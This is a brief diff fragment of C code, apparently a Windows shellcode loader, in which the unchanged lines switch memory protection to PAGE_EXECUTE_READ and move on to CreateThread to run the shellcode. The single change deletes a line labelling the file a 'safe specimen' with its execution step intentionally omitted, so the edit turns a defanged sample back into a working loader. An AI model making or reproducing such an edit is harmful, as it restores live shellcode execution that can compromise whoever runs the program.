@@ -50,7 +50,6 @@ int main()
     }
 
     printf("Changed memory protection to PAGE_EXECUTE_READ.\n");
-    printf("Safe specimen: execution step intentionally omitted.\n");
 
     // 4) Create a new thread to execute the shellcode
     HANDLE hThread = CreateThread(
